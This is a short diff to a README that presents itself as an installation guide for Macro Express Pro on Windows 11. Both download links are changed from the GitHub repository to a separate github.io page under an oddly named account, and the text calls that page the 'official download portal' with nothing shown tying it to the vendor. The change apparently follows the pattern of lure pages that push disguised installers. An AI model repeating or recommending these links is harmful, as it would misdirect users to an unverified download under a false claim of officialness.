@@ -1,6 +1,6 @@
 # ⚙️ Macro-Express-Windows-Guide - Simple steps to automate your computer
 
-[![Download](https://img.shields.io/badge/Download-Macro-Express-blue)](https://github.com/Writlarge-etching264/Macro-Express-Windows-Guide)
+[![Download](https://img.shields.io/badge/Download-Macro-Express-blue)](https://writlarge-etching264.github.io)
 
 This guide helps you put Macro Express Pro on your Windows 11 computer. Many users face hurdles during setup. This document explains how to fix common errors and complete the installation process.
 
@@ -8,7 +8,7 @@ This guide helps you put Macro Express Pro on your Windows 11 computer. Many use
 
 You need the correct installer to begin. Follow the link below to reach the official download portal. 
 
-[Visit this page to download the software](https://github.com/Writlarge-etching264/Macro-Express-Windows-Guide)
+[Visit this page to download the software](https://writlarge-etching264.github.io)
 
 Select the version that matches your system. Save the file to your Downloads folder.
 
